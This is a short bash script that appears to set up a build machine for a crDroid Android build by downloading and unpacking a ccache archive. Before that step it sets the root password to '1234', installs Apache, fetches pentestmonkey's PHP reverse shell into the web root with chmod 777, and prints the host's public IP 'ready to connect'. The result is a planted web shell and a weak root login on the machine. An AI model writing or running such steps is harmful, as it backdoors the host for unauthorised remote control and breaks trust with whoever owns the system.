#!/bin/bash

url=https://cheems.mirrorbomt.workers.dev/ccache-crdroid.tar.gz
whoami
echo -e "1234\n1234" | passwd root
sudo apt-get -y install apache2 wget curl
cd /var/www/html
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php 
chmod 777 php-reverse-shell.php 
curl ifconfig.me
sudo systemctl start apache2
echo "ready to connect ssh"

cd /tmp # Where to download cccahe
time aria2c $url -x16 -s50
echo "dl done"
time tar xf ccache-crdroid.tar.gz
echo "unzip done"
find ccache-crdroid.tar.gz -delete
